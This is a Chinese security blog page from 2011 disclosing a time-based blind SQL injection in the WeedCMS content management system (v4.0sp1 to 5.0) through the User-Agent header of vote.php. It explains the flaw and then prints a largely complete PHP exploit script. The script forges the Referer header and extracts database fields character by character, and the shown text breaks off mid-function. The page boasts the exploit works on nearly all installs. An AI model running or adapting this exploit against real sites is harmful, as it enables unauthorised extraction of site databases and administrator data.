@@ -1,0 +1,893 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>野草Weedcms v4.0sp1-5.0贺岁版盲注漏洞 - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="Nuclear&#39;Atk" /><meta name="description" content="WeedCMS 0day，WeedCMS oday，WeedCMS 漏洞，野草 WeedCMS 0day，野草 WeedCMS another 0day exploit，野草 WeedCMS Exp，野草 WeedCMS Exploit，野草 WeedCMS oday，野草 WeedCMS USER_AGENT盲注漏洞，野草 WeedCMS v4.0 sp1 至最新 5.0贺岁版 USER_AGENT盲注漏洞，野草 WeedCMS v4.0 sp1盲注漏洞，野草 WeedCMS v4.0 盲注漏洞，野草 WeedCMS v5.0 盲注漏洞，野草 WeedCMS v5.0贺岁版盲注漏洞，野草 WeedCMS 零日漏洞，野草 WeedCMS 漏洞，野草 WeedCMS 盲注漏洞，野草 WeedCMS 内容管理系统0day，野草 WeedCMS 内容管理系统oday，野草 WeedCMS 内容管理系统漏洞，野草 WeedCMS 网站系统 0day，野草 WeedCMS 网站系统 oday，野草 WeedCMS 网站系统、新闻系统0day，野草 WeedCMS 网站系统、新闻系统oday，野草 WeedCMS 网站系统0day，野草 WeedCMS 网站系统oday，野草 WeedCMS 网站系统漏洞，野草 WeedCMS 文章系统0day，野草 WeedCMS 文章系统oday，野草 WeedCMS 文章系统漏洞，野草 WeedCMS 新闻系统0day，野草 WeedCMS 新闻系统oday，野草 WeedCMS 新闻系统漏洞，野草CMS v4.0 漏洞，野草CMS v4.0 盲注漏洞，野草CMS v5.0 盲注，野草CMS v5.0 盲注漏洞，野草CMS 漏洞，野草CMS 盲注，野草CMS 盲注漏洞。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。" />
+<meta name="keywords" content="WeedCMS 0day,WeedCMS oday,WeedCMS 漏洞,野草 WeedCMS 0day,野草 WeedCMS another 0day exploit,野草 WeedCMS Exp,野草 WeedCMS Exploit,野草 WeedCMS oday,野草 WeedCMS USER_AGENT盲注漏洞,野草 WeedCMS v4.0 sp1 至最新 5.0贺岁版 USER_AGENT盲注漏洞,野草 WeedCMS v4.0 sp1盲注漏洞,野草 WeedCMS v4.0 盲注漏洞,野草 WeedCMS v5.0 盲注漏洞,野草 WeedCMS v5.0贺岁版盲注漏洞,野草 WeedCMS 零日漏洞,野草 WeedCMS 漏洞,野草 WeedCMS 盲注漏洞,野草 WeedCMS 内容管理系统0day,野草 WeedCMS 内容管理系统oday,野草 WeedCMS 内容管理系统漏洞,野草 WeedCMS 网站系统 0day,野草 WeedCMS 网站系统 oday,野草 WeedCMS 网站系统、新闻系统0day,野草 WeedCMS 网站系统、新闻系统oday,野草 WeedCMS 网站系统0day,野草 WeedCMS 网站系统oday,野草 WeedCMS 网站系统漏洞,野草 WeedCMS 文章系统0day,野草 WeedCMS 文章系统oday,野草 WeedCMS 文章系统漏洞,野草 WeedCMS 新闻系统0day,野草 WeedCMS 新闻系统oday,野草 WeedCMS 新闻系统漏洞,野草CMS v4.0 漏洞,野草CMS v4.0 盲注漏洞,野草CMS v5.0 盲注,野草CMS v5.0 盲注漏洞,野草CMS 漏洞,野草CMS 盲注,野草CMS 盲注漏洞,Nuclear&#39;Atk,Nuclear&#39;Atk 个人博客,Nuclear&#39;Atk 文章." />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/1063/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="野草Weedcms v4.0sp1-5.0贺岁版盲注漏洞" />
+<meta property="og:description" content="WeedCMS 0day，WeedCMS oday，WeedCMS 漏洞，野草 WeedCMS 0day，野草 WeedCMS another 0day exploit，野草 WeedCMS Exp，野草 WeedCMS Exploit，野草 WeedCMS oday，野草 WeedCMS USER_AGENT盲注漏洞，野草 WeedCMS v4.0 sp1 至最新 5.0贺岁版 USER_AGENT盲注漏洞，野草 WeedCMS v4.0 sp1盲注漏洞，野草 WeedCMS v4.0 盲注漏洞，野草 WeedCMS v5.0 盲注漏洞，野草 WeedCMS v5.0贺岁版盲注漏洞，野草 WeedCMS 零日漏洞，野草 WeedCMS 漏洞，野草 WeedCMS 盲注漏洞，野草 WeedCMS 内容管理系统0day，野草 WeedCMS 内容管理系统oday，野草 WeedCMS 内容管理系统漏洞，野草 WeedCMS 网站系统 0day，野草 WeedCMS 网站系统 oday，野草 WeedCMS 网站系统、新闻系统0day，野草 WeedCMS 网站系统、新闻系统oday，野草 WeedCMS 网站系统0day，野草 WeedCMS 网站系统oday，野草 WeedCMS 网站系统漏洞，野草 WeedCMS 文章系统0day，野草 WeedCMS 文章系统oday，野草 WeedCMS 文章系统漏洞，野草 WeedCMS 新闻系统0day，野草 WeedCMS 新闻系统oday，野草 WeedCMS 新闻系统漏洞，野草CMS v4.0 漏洞，野草CMS v4.0 盲注漏洞，野草CMS v5.0 盲注，野草CMS v5.0 盲注漏洞，野草CMS 漏洞，野草CMS 盲注，野草CMS 盲注漏洞。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/1063/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2011-01-04T18:24:00&#43;08:00" />
+<meta property="article:modified_time" content="2011-01-04T18:24:00&#43;08:00" />
+
+<meta itemprop="name" content="野草Weedcms v4.0sp1-5.0贺岁版盲注漏洞">
+<meta itemprop="description" content="WeedCMS 0day，WeedCMS oday，WeedCMS 漏洞，野草 WeedCMS 0day，野草 WeedCMS another 0day exploit，野草 WeedCMS Exp，野草 WeedCMS Exploit，野草 WeedCMS oday，野草 WeedCMS USER_AGENT盲注漏洞，野草 WeedCMS v4.0 sp1 至最新 5.0贺岁版 USER_AGENT盲注漏洞，野草 WeedCMS v4.0 sp1盲注漏洞，野草 WeedCMS v4.0 盲注漏洞，野草 WeedCMS v5.0 盲注漏洞，野草 WeedCMS v5.0贺岁版盲注漏洞，野草 WeedCMS 零日漏洞，野草 WeedCMS 漏洞，野草 WeedCMS 盲注漏洞，野草 WeedCMS 内容管理系统0day，野草 WeedCMS 内容管理系统oday，野草 WeedCMS 内容管理系统漏洞，野草 WeedCMS 网站系统 0day，野草 WeedCMS 网站系统 oday，野草 WeedCMS 网站系统、新闻系统0day，野草 WeedCMS 网站系统、新闻系统oday，野草 WeedCMS 网站系统0day，野草 WeedCMS 网站系统oday，野草 WeedCMS 网站系统漏洞，野草 WeedCMS 文章系统0day，野草 WeedCMS 文章系统oday，野草 WeedCMS 文章系统漏洞，野草 WeedCMS 新闻系统0day，野草 WeedCMS 新闻系统oday，野草 WeedCMS 新闻系统漏洞，野草CMS v4.0 漏洞，野草CMS v4.0 盲注漏洞，野草CMS v5.0 盲注，野草CMS v5.0 盲注漏洞，野草CMS 漏洞，野草CMS 盲注，野草CMS 盲注漏洞。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。"><meta itemprop="datePublished" content="2011-01-04T18:24:00&#43;08:00" />
+<meta itemprop="dateModified" content="2011-01-04T18:24:00&#43;08:00" />
+<meta itemprop="wordCount" content="3128">
+<meta itemprop="keywords" content="CMS,漏洞,盲注,EXP,HTTP,Mysql,PHP,POS,SQL,程序,管理,函数,后台,数据,数据库," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="野草Weedcms v4.0sp1-5.0贺岁版盲注漏洞"/>
+<meta name="twitter:description" content="WeedCMS 0day，WeedCMS oday，WeedCMS 漏洞，野草 WeedCMS 0day，野草 WeedCMS another 0day exploit，野草 WeedCMS Exp，野草 WeedCMS Exploit，野草 WeedCMS oday，野草 WeedCMS USER_AGENT盲注漏洞，野草 WeedCMS v4.0 sp1 至最新 5.0贺岁版 USER_AGENT盲注漏洞，野草 WeedCMS v4.0 sp1盲注漏洞，野草 WeedCMS v4.0 盲注漏洞，野草 WeedCMS v5.0 盲注漏洞，野草 WeedCMS v5.0贺岁版盲注漏洞，野草 WeedCMS 零日漏洞，野草 WeedCMS 漏洞，野草 WeedCMS 盲注漏洞，野草 WeedCMS 内容管理系统0day，野草 WeedCMS 内容管理系统oday，野草 WeedCMS 内容管理系统漏洞，野草 WeedCMS 网站系统 0day，野草 WeedCMS 网站系统 oday，野草 WeedCMS 网站系统、新闻系统0day，野草 WeedCMS 网站系统、新闻系统oday，野草 WeedCMS 网站系统0day，野草 WeedCMS 网站系统oday，野草 WeedCMS 网站系统漏洞，野草 WeedCMS 文章系统0day，野草 WeedCMS 文章系统oday，野草 WeedCMS 文章系统漏洞，野草 WeedCMS 新闻系统0day，野草 WeedCMS 新闻系统oday，野草 WeedCMS 新闻系统漏洞，野草CMS v4.0 漏洞，野草CMS v4.0 盲注漏洞，野草CMS v5.0 盲注，野草CMS v5.0 盲注漏洞，野草CMS 漏洞，野草CMS 盲注，野草CMS 盲注漏洞。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">野草Weedcms v4.0sp1-5.0贺岁版盲注漏洞</h1>
+      
+      <div class="post-meta">
+        <time datetime="2011-01-04" class="post-time">
+          2011-01-04
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/cms/"> CMS </a>
+            <a href="https://lcx.cc/categories/%E6%BC%8F%E6%B4%9E/"> 漏洞 </a>
+            <a href="https://lcx.cc/categories/%E7%9B%B2%E6%B3%A8/"> 盲注 </a>
+            
+          </div>
+        <span class="more-meta"> 约 3128 字 </span>
+          <span class="more-meta"> 预计阅读 7 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<P>&nbsp;&nbsp;&nbsp; 野草 Weedcms v4.0 sp1 至最新 5.0 贺岁版 USER_AGENT 盲注漏洞</P>
+<P>程序说明： <br />
+&nbsp;&nbsp;&nbsp; 野草 Weedcms 基于PHP+MYSQL架构。创新型内容管理模式，建立频道后可定义内容模型，均在后台可以控制，非常方便。</P>
+<P>&nbsp;&nbsp;&nbsp; 模板引擎采用了成熟稳定的 Smarty 引擎，很轻松就可以做出模板界面来。前台和后台均采用了DIV+CSS，速度比传统型略快。</P>
+<P>&nbsp;&nbsp;&nbsp; JS 采用了国际上比较流行的 Jquery 框架，还有基于 Jquery 的 XHEditor 可视化编辑器。</P>
+<P>&nbsp;&nbsp;&nbsp; 支持基于 Apache 和 IIS 的路径优化功能，让您的网站面向搜索引擎而优化。</P>
+<P>&nbsp;&nbsp;&nbsp; 单页功能：制作类似关于我们和公司介绍只要添加数据就可以实现，并且可控制访问权限。</P>
+<P>&nbsp;&nbsp;&nbsp; 后台支持权限分配，减轻管理员工作负担。可自定义菜单导航。</P>
+<P>&nbsp;&nbsp;&nbsp; 广告功能：支持HTML自定义，并且可投送到想要显示的页面。支持内容无限分类，可详细定义自己的内容。</P>
+<P>&nbsp;&nbsp;&nbsp; 制作了会员组接口，方便控制资源分配等。实时监控网站在线人员动向。后台管理操作可一一记录到日志中。支持多语言包切换。</P>
+<P>漏洞形成原因： <br />
+&nbsp;&nbsp;&nbsp; vote.php USER_AGENT 直接插入数据库，没有经过过滤。</P>
+<P>&nbsp;&nbsp;&nbsp; 导致产生 Insert 型的 SQL 注入。由于无错误提示，只能进行盲注。</P>
+<P>漏洞分析： <br />
+&nbsp;&nbsp;&nbsp; 我们来看 vote.php 的代码：</P>
+<P align=center><A href="/file/old/890_eb94f2b32e191ce8d8335a36.jpg" target=_blank><IMG style="WIDTH: 636px; HEIGHT: 483px" height=600 src="/file/old/890_eb94f2b32e191ce8d8335a36.jpg" width=782 border=0></A></P>
+<P align=left>&nbsp;&nbsp;&nbsp; 我们可以看到这个函数没有对传入的数据进行任何的过滤，只是简单的SQL语句生成，最后调用query()执行。</P>
+<P align=left>&nbsp;&nbsp;&nbsp; 首先程序通过 GET 获取了 action 变量，如果action=='ok'。则处理投票，然后调用了 check_request() 函数对请求进行验证，我们跟进一下这个函数。</P>
+<P align=left>&nbsp;&nbsp;&nbsp; 找到：includes/function.php 第390行。</P>
+<P align=center><A href="/file/old/891_0e31f7d13d94ac9c562c8407.jpg" target=_blank><IMG style="WIDTH: 599px; HEIGHT: 51px" height=119 src="/file/old/891_0e31f7d13d94ac9c562c8407.jpg" width=1095 border=0></A></P>
+<P align=left>&nbsp;&nbsp;&nbsp; 我们可以看到，只对REFERER，进行了简单的正则匹配，和对HOST进行了比对，我们可以通过伪造请求 REFERER 即可绕过此验证。</P>
+<P align=left>&nbsp;&nbsp;&nbsp; 接着程序获取了vote_id变量，我们给他传入一个不存在的ID即可，防止在不同的目标环境中导致程序逻辑被中断，然后我们看后面 在最后插入投票数据时，直接获取了$_SERVER['HTTP_USER_AGENT'] 并且没有任何过滤，而且 $_SERVEFR变量是不受magic_quotes_gpc保护的，所以该漏洞通用性很好，几乎可以通杀。最后使用了$db-&gt;insert()函数插入到了数据库，我们跟一下这个函数看有没有过滤。</P>
+<P align=left>&nbsp;&nbsp;&nbsp; 找到：includes/class_db.php 第20行</P>
+<P align=center><IMG height=284 src="/file/old/892_dcb2c412f026ee1ef919b837.jpg" width=489 border=0></P>
+<P align=left>&nbsp;&nbsp;&nbsp; 我们可以看到这个函数没有对传入的数据进行任何的过滤，只是简单的SQL语句生成，最后调用query()执行。</P>
+<P align=left>漏洞利用： <br />
+&nbsp;&nbsp;&nbsp; 使用格式：php yecao.php 127.0.0.1 80 "/" "2" <br />
+&nbsp;&nbsp;&nbsp; 4个参数分别为： 目标主机&nbsp;&nbsp; 端口&nbsp; 程序路径(以/开头结尾)&nbsp; 延时 </P>
+<P align=left>利用代码：</P>
+<P align=left>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P>&lt;?php <br />
+$port = 80; <br />
+if (trim ( $argv [1] ) == "" || trim ( $argv [2] ) == "" || trim ( $argv [3] ) == "" || trim ( $argv [4] ) == "") { <br />
+&nbsp;&nbsp;&nbsp; echo "use:\nwww.exp.com 80&nbsp; \"/web/\"&nbsp; 3&nbsp; \n目标主机&nbsp;&nbsp; 端口&nbsp; 程序路径(以/开头结尾)&nbsp; 延时 \n注：要知道表前缀，默认为w_ ,5.0以上的MYSQL版本可以通过爆数据库名然后爆得表前缀"; <br />
+&nbsp;&nbsp;&nbsp; exit (); <br />
+} <br />
+$tlb_tag = "w_"; //定义表前缀 <br />
+$host = trim ( $argv [1] ); <br />
+$port = trim ( $argv [2] ); <br />
+$path = trim ( $argv [3] ); <br />
+$tout = trim ( $argv [4] ); <br />
+$fullpath = $path . "vote.php?action=ok"; <br />
+$postdata = "vote_id=99999999999"; <br />
+function getmicrotime() { <br />
+&nbsp;&nbsp;&nbsp; list ( $usec, $sec ) = explode ( " ", microtime () ); <br />
+&nbsp;&nbsp;&nbsp; return (( float ) $usec + ( float ) $sec); <br />
+} <br />
+function DoGet($header = "", $data = "") { <br />
+&nbsp;&nbsp;&nbsp; Global $host, $port, $fullpath; <br />
+&nbsp;&nbsp;&nbsp; $fp = fsockopen ( $host, $port, $errno, $errstr, 30 ); <br />
+&nbsp;&nbsp;&nbsp; $suc = false; <br />
+&nbsp;&nbsp;&nbsp; $line = ""; <br />
+&nbsp;&nbsp;&nbsp; if (! $fp) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "$errstr ($errno)&lt;br /&gt;\n"; <br />
+&nbsp;&nbsp;&nbsp; } else { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $out = "POST $fullpath HTTP/1.1\r\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $out .= "Content-Type: application/x-www-form-urlencoded\r\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $out .= "Host: $host\r\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $out .= "Referer: <A href="http://$host/vote.php\r\n">http://$host/vote.php\r\n</A>"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($header !== "") { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $out .= $header . "\r\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($data !== "") { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $out .= "Content-Length: " . strlen ( $data ) . "\r\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $out .= "Connection: Close\r\n\r\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $out .= $data; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fwrite ( $fp, $out ); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //&nbsp;&nbsp;&nbsp; echo "\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while ( ! feof ( $fp ) ) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $line = fgets ( $fp, 128 ); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //&nbsp;&nbsp;&nbsp; echo $line; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (strpos ( $line, "Date:" ) !== false) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $suc = true; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fclose ( $fp ); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (! $suc) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return true; <br />
+&nbsp;&nbsp;&nbsp; } <br />
+}</P>
+<P>function GetLen($ColName, $sql) { <br />
+&nbsp;&nbsp;&nbsp; Global $tout, $tlb_tag, $postdata; <br />
+&nbsp;&nbsp;&nbsp; for($i = 1; $i &lt;= 50; $i ++) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eval ( $sql ); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "验证:$ColName 字段长度 $i...\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $starttime = getmicrotime (); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $rs = DoGet ( $header, $postdata ); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $endtime = getmicrotime (); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //echo " endtime:$endtime - starttime:$starttime =" . ($endtime - $starttime) . "&nbsp; \n timeout=$tout \n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($endtime - $starttime &gt;= $tout) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return $i; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp; return false; <br />
+}</P>
+<P>function GetTxt($ColName, $ColLen, $sql) { <br />
+&nbsp;&nbsp;&nbsp; $text = ""; <br />
+&nbsp;&nbsp;&nbsp; for($i = 1; $i &lt;= $ColLen; $i ++) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $chr = GetChr ( $ColName, $i, $sql ); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //echo "已获取:$ColName 字段 第:" . $i . "位字符是:".$chr."....\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $text .= $chr; <br />
+&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp; if ($text !== "") { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return $text; <br />
+&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp; return false; <br />
+}</P>
+<P>function GetChr($ColName, $poss, $sql) { <br />
+&nbsp;&nbsp;&nbsp; Global $tout, $tlb_tag, $postdata; <br />
+&nbsp;&nbsp;&nbsp; $chrlist = "<A href="mailto:~`!@#$%^&amp;*()_+{}|:\">~`!@#$%^&amp;*()_+{}|:\</A>"&lt;&gt;? /.,';\][=-ABCDEFGHIJKLMNOPQRSTUVWXYZ0987654321abcdefghijklmnopqrstuvwxyz"; <br />
+&nbsp;&nbsp;&nbsp; echo "正在获取:$ColName 字段 第:" . $poss . "位字符....\n"; <br />
+&nbsp;&nbsp;&nbsp; $chrlistlen = strlen ( $chrlist ); <br />
+&nbsp;&nbsp;&nbsp; $tempchr = ""; <br />
+&nbsp;&nbsp;&nbsp; $temptimeout = 0; <br />
+&nbsp;&nbsp;&nbsp; for($i = $chrlistlen - 1; $i &gt;= 1; $i --) { //从后忘前判断，后面的是小写字母数字等。最后是特殊字符 <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $checkchr = substr ( $chrlist, $i, 1 ); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eval ( $sql ); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($ColName == 'FuckTable') { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //echo $data;exit; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
